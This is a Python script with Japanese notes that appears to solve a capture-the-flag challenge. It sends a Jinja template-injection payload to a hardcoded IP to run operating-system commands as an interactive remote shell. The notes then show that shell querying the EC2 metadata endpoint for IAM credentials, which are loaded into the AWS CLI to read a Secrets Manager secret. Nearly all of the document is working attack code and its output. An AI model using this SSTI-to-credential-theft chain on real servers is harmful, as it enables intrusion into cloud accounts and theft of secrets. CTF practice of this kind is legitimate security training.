import html
import requests


def execute(command):
    payload = (
        "{{request.application.__globals__.__builtins__.__import__('os').popen(COMMAND).read()}}"
    ).replace("COMMAND", f"'{command}'")

    res = requests.post("http://13.59.188.191:8000/greet", data={"name": payload})
    return res.text


while True:
    cmd = input("> ")
    if cmd == "exit":
        break
    res = execute(cmd)
    res = res.removeprefix("Hello, ").removesuffix("!")
    res = html.unescape(res)
    print(res)


"""
サーバーにて
---
> curl http://169.254.169.254/latest/meta-data/public-hostname
ec2-13-59-188-191.us-east-2.compute.amazonaws.com
> curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ec2instancerole
> curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2instancerole
→ AWS_ACCESS_KEY_ID とか手に入る
"""

"""
ローカルにて
---
❯ vim .env
→ AWS_ACCESS_KEY_ID などを export
❯ source .env
❯ aws configure
AWS Access Key ID [None]: 
AWS Secret Access Key [None]: 
Default region name [None]: us-east-2
Default output format [None]: 
→ 他の情報は設定しない（手に入れた情報は AWS_SESSION_TOKEN とセットで機能するキーなので）

❯ aws secretsmanager get-secret-value --secret-id flag
{
    "ARN": "arn:aws:secretsmanager:us-east-2:614108131227:secret:flag-imCL9a",
    "Name": "flag",
    "VersionId": "6383bf21-9007-465c-9908-b08d7397bb0b",
    "SecretString": "{\"flag\":\"squ1rrel{you_better_not_have_vibe_coded_the_solution_to_this_challenge}\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1743782502.266
}
→ id は flag かなという推測
"""
